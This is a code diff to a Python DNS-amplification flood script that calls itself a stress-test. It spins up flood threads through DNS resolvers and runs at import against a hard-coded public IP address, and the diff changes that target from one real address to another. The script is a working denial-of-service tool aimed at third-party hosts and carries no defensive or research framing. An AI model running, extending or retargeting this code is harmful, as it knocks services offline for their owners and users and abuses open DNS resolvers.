@@ -3,7 +3,8 @@ import time
 import random
 import threading
 import argparse
-from dns_server_check import read_servers
+from amplification.dns_server_check import read_servers
+
 
 packets = 0
 
@@ -33,7 +34,8 @@ class FloodThread(threading.Thread):
         packets += 1 
         # print(packets)
 
-def main(dns_servers, target, timeout=10, threads=20):
+
+def maintain(target, dns_servers = read_servers()[0], timeout=10, threads=20):
     print('Beginning of stress-test using DNS-amplification attack')
     print('Duration: ', timeout, ' с')
     flood_threads = []
@@ -48,5 +50,8 @@ def main(dns_servers, target, timeout=10, threads=20):
                 flood_threads[i].join()
             break
     return packets
-
-main(read_servers()[0], '188.214.128.77')
+    
+print(maintain('157.240.205.35'))
+# if __name__ == '__main__':
+#     main()
+#     FloodThread
